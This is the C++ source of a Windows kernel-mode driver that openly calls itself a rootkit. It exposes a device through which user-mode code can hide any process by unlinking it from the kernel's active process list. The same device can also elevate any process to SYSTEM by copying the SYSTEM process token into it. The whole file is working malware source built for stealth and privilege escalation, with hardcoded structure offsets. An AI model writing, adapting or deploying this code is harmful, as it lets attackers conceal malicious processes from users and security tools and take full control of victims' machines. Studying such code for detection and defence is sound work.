#include <ntifs.h>
#include <ntddk.h>

#define TOKEN_OFFSET 0x4b8
#define LIST_ENTRY_OFFSET 0x448

/*
DeviceType
	Contains the value for FILE_DEVICE_DOT4 (0x3a).
Function
	Contains the IOCTL Function value.
Method
	Contains the method codes for how buffers are passed for I/O and FS controls.
Access
	Contains the access check values.
*/
enum class RootkitIoctls {
	HideProcces = CTL_CODE(0x8000, 0x800, METHOD_NEITHER, FILE_ANY_ACCESS),
	Elevate = CTL_CODE(0x8000, 0x801, METHOD_NEITHER, FILE_ANY_ACCESS)
};

struct ParametersFromUser {
	ULONG pid;
};

typedef struct _EX_FAST_REF {
	union {
		PVOID Object;
		ULONG RefCnt : 3;//0-3
		ULONG Value;
	};
} EX_FAST_REF, * PEX_FAST_REF;

extern "C" {
	void RootkitDriverUnload(_In_ PDRIVER_OBJECT DriverObject);
	NTSTATUS RootkitCreateClose(PDEVICE_OBJECT DeviceObject, PIRP Irp);
	NTSTATUS RootkitDeviceControl(PDEVICE_OBJECT, PIRP Irp);

	NTSTATUS RootkitHandleHideProcess(PIRP Irp);
	NTSTATUS RootkitHandleElevate(PIRP Irp);
	NTSTATUS RootkitParametersFromIrp(PIRP Irp, ParametersFromUser& params);
}

extern "C"
NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath) {
	UNREFERENCED_PARAMETER(RegistryPath);
	DbgPrint("Rootkit: DriverEntry started.\n");

	DriverObject->DriverUnload = RootkitDriverUnload;
	DriverObject->MajorFunction[IRP_MJ_CREATE] = RootkitCreateClose;
	DriverObject->MajorFunction[IRP_MJ_CLOSE] = RootkitCreateClose;
	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = RootkitDeviceControl;

	UNICODE_STRING devName = RTL_CONSTANT_STRING(L"\\Device\\RootkitDev");
	PDEVICE_OBJECT DeviceObject;
	NTSTATUS status = IoCreateDevice(DriverObject, 0, &devName,
		FILE_DEVICE_UNKNOWN, 0, FALSE, &DeviceObject);

	if (!NT_SUCCESS(status)) {
		DbgPrint("Rootkit: Failed to create device (0x%08X)\n", status);
		return status;
	}

	UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\??\\RootkitDev");
	status = IoCreateSymbolicLink(&symLink, &devName);
	if (!NT_SUCCESS(status)) {
		DbgPrint("Rootkit: Failed to create symbolic link (0x%08X)\n", status);
		IoDeleteDevice(DeviceObject);
		return status;
	}

	DbgPrint("Rootkit: DriverEntry completed successfully\n");
	return STATUS_SUCCESS;
}

void RootkitDriverUnload(_In_ PDRIVER_OBJECT DriverObject) {
	UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\??\\RootkitDev");
	IoDeleteSymbolicLink(&symLink);
	IoDeleteDevice(DriverObject->DeviceObject);

	DbgPrint("Rootkit: Driver unloaded and pool freed.\n");
}

NTSTATUS RootkitCreateClose(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
	UNREFERENCED_PARAMETER(DeviceObject);
	DbgPrint("Rootkit: Create/Close called.\n");

	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);

	return STATUS_SUCCESS;
}

NTSTATUS RootkitDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
	auto stack = IoGetCurrentIrpStackLocation(Irp);
	NTSTATUS status = STATUS_SUCCESS;

	DbgPrint("Rootkit: Received an IOCTL.\n");
	switch (static_cast<RootkitIoctls>(stack->Parameters.DeviceIoControl.IoControlCode)) {
	case RootkitIoctls::HideProcces:
		status = RootkitHandleHideProcess(Irp);
		break;

	case RootkitIoctls::Elevate:
		status = RootkitHandleElevate(Irp);
		break;

	default:
		status = STATUS_INVALID_DEVICE_REQUEST;
		break;
	}

	Irp->IoStatus.Information = 0;
	Irp->IoStatus.Status = status;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return status;
}

NTSTATUS RootkitHandleHideProcess(PIRP Irp) {
	NTSTATUS status = STATUS_SUCCESS;
	ParametersFromUser params;

	DbgPrint("Rootkit: received HideProcess command.\n");
	status = RootkitParametersFromIrp(Irp, params);
	if (!NT_SUCCESS(status))
		return status;

	DbgPrint("Rootkit: HideProcess received process id: %d \n", params.pid);

	PEPROCESS eprocess;
	status = PsLookupProcessByProcessId(ULongToHandle(params.pid), &eprocess);
	if (!NT_SUCCESS(status)) {
		DbgPrint("Rootkit: HideProcess failed to locate process %d code: (0x%08X)\n",
			params.pid, status);
		return status;
	}

	DbgPrint("Rootkit: HideProcess EPROCESS struct addr: %p\n", eprocess);

	unsigned char* listEntryAddr = reinterpret_cast<unsigned char*>(eprocess)
		+ LIST_ENTRY_OFFSET;//ActiveProcessLinks
	PLIST_ENTRY CurrListEntry = reinterpret_cast<PLIST_ENTRY>(listEntryAddr);
	DbgPrint("Rootkit: HideProcess address of list_entry: %p\n", CurrListEntry);

	if (!CurrListEntry)
		return STATUS_UNSUCCESSFUL;

	PLIST_ENTRY PrevListEntry = CurrListEntry->Blink;
	PLIST_ENTRY NextListEntry = CurrListEntry->Flink;

	// unlink target process from processes near in linked list
	PrevListEntry->Flink = CurrListEntry->Flink;
	NextListEntry->Blink = CurrListEntry->Blink;

	// Point Flink and Blink to self
	CurrListEntry->Flink = CurrListEntry;
	CurrListEntry->Blink = CurrListEntry;

	//decrease reference count of EPROCESS object
	ObDereferenceObject(eprocess);
	DbgPrint("Rootkit: Successfully unlinked process with pid: %d\n", params.pid);
	return STATUS_SUCCESS;
}

NTSTATUS RootkitHandleElevate(PIRP Irp) {
	NTSTATUS status = STATUS_SUCCESS;
	ParametersFromUser params;

	DbgPrint("Rootkit: received Elevate command.\n");
	status = RootkitParametersFromIrp(Irp, params);
	if (!NT_SUCCESS(status))
		return status;

	DbgPrint("Rootkit: Elevate received process id: %d \n", params.pid);

	//get EPROCESS structure for process to be elevated
	PEPROCESS eprocess;
	status = PsLookupProcessByProcessId(ULongToHandle(params.pid), &eprocess);
	if (!NT_SUCCESS(status)) {
		DbgPrint("Rootkit: Elevate failed to locate process by pid. code: (0x%08X)\n",
			status);
		return status;
	}

	//get EPROCESS structure for system process
	PEPROCESS systemProc;
	status = PsLookupProcessByProcessId(ULongToHandle(4), &systemProc);
	if (!NT_SUCCESS(status)) {
		DbgPrint("Rootkit: Elevate failed to locate SYSTEM process by pid. code: (0x%08X)\n",
			status);
		return status;
	}

	DbgPrint("Rootkit: Elevate EPROCESS struct addr: %p\n", eprocess);
	DbgPrint("Rootkit: Elevate SYSTEM EPROCESS struct addr: %p\n", systemProc);

	unsigned char* systemTokenAddress = reinterpret_cast<unsigned char*>(systemProc) +
		TOKEN_OFFSET;
	EX_FAST_REF systemToken = *reinterpret_cast<PEX_FAST_REF>(systemTokenAddress);
	DbgPrint("Rootkit: Elevate System token EX_FAST_REF: %p\n", systemToken.Object);

	//elevate change the process token to point at the system token
	unsigned char* procTokenAddress = reinterpret_cast<unsigned char*>(eprocess) +
		TOKEN_OFFSET;
	PULONG procTokenPointer = reinterpret_cast<PULONG>(procTokenAddress);
	*procTokenPointer = systemToken.Value;//eq

	//decrease reference count of EPROCESS objects
	ObDereferenceObject(eprocess);
	ObDereferenceObject(systemProc);

	return status;
}

NTSTATUS RootkitParametersFromIrp(PIRP Irp, ParametersFromUser& params) {
	auto stack = IoGetCurrentIrpStackLocation(Irp);
	if (stack->Parameters.DeviceIoControl.InputBufferLength < sizeof(ParametersFromUser))
		return STATUS_BUFFER_TOO_SMALL;

	auto data = (ParametersFromUser*)stack->Parameters.DeviceIoControl.Type3InputBuffer;
	if (data == nullptr)
		return STATUS_INVALID_PARAMETER;

	params = *data;
	return STATUS_SUCCESS;
}

